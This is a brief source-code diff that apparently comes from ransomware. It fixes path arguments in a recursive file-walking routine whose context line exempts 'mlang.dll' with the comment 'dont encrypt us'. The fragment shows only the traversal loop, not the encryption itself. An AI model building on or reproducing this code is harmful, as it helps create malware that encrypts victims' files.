@@ -76,7 +76,7 @@ void FileManager::TransformFiles(const std::string& startPath, void (FileManager
         return;
 
     for ( auto& dir : std::filesystem::recursive_directory_iterator(startPath) ) {
-        if ( std::filesystem::is_directory(dir) || std::filesystem::file_size(dir) <= 0 )
+        if ( std::filesystem::is_directory(dir.path()) || std::filesystem::file_size(dir.path()) <= 0 )
             continue;
 
         if ( dir.path().filename() == "mlang.dll" ) // dont encrypt us
